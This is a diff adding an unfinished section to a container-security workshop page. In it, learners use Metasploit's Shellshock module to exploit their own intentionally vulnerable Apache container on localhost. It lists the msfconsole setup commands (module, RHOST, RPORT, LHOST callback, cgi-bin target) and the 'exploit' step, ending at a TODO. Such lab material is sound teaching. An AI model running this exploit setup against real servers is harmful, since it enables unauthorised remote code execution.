@@ -1,6 +1,110 @@
 include::_attributes.adoc[]
 
-= 4. Container Security
+= Container Security
+
+If you looking to run containers in any kind of production capacity, simply knowing _how_ to run a container is not enough.  Ensuring that the container is _secure_ is as critical as making sure any production facing infrastructure is secure.
+
+Sometimes people can be lulled into a false sense of security around containers because of the sense that they are isolated from the host (e.g. VM). However, in the previous sections we made allowances to get our containers up and running, some of which xref:podman-intro.adoc#security_vuln[we highlighted previously].
+
+[#exploit_containers]
+== Exploiting Vulnerable container
+
+In order to get a sense of how consequential these security exploits can be, let's exploit some of the issues in the containers we already have running
+
+image:shellshock-logo.png[role=right,width=50]
+Our `{apache-server-image-insecure}` has a huge vulnerability in it that is further excerbated by the manner in which we've run our container.  The vulnerability is the (in)famous link:https://en.wikipedia.org/wiki/Shellshock_(software_bug)[Shellshock vulnerability] 
+
+. First ensure the `{apache-committed-container-image}` is running by running the following command in the terminal
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+podman ps
+----
++
+. You should see output something like below.  If you don't, then run the container as per xref:container-persistence.adoc#podman_run_httpd[here]
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+include::partial$podman_ps.adoc[]
+----
+
+=== Using Metasploit
+
+We're going to use a tool called link:[metasploit] (which has already been installed on your VM instance) to exploit the vulnerability (with frightening ease).  
+
+. We are going to run metasploit as a non-root user in another shell.  Split your terminal to open a new, non-root, shell
+. Next we need to gather some information about the instance that we will (soon) feed to `metasploit`.  Run the following command to store the ip address of your instance
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+LHOST=$(dig +short myip.opendns.com @resolver1.opendns.com)
+----
++
+. Next, start up metasploit in your terminal by running the following command:
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+msfconsole
+----
++
+. When prompted, decline to load the metasploit DB
+. When it's done initializing, you should see output like this
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+include::partial$metasploit_output_initial.adoc[]
+----
++
+. Next we need to configure some details for metasploit to be able to exploit our container
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+use multi/http/apache_mod_cgi_bash_env_exec #<.>
+set RHOST 127.0.0.1 #<.>
+set RPORT 8081 #<.>
+set LHOST pass:[${LHOST}] #<.>
+set targeturi /cgi-bin/log-visitor.sh #<.>
+----
+<.> This is a metasploit module that plugs into the console.  There is a whole library of modules that are used with metasploit.  This one specifically targets the shellshock vulnerability via Apache's cgi-bin support
+<.> This is the address of the server (which we're running locally in a container)
+<.> The port the container is listening on (in our case the port that is forwarded to the container via the `-p` option to `podman run`)
+<.> The ip address of the VM instance
+<.> The target URL of a cgi-bin script.  Those that are astute might recognize this as the cgi-bin endpoint of the guestbook page (`hello.html`)
++
+. To ensure we've got everything right, we can check whether our setup is currently targeting a vulnerable container
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+check
+----
++
+. Which should report the following output if successful: 
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+
+----
+
+=== Exploiting Shellshock
+
+. Now it's time to exploit our running container.  This is as simple as running the following inside the metasploit console (it causes the `multi/http/apache_mod_bash_env_exec` module to be run with the configuration we set up in the previous section)
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+exploit
+----
+
+# TODO: Finish this section
+
 
 == Scanning Containers
 
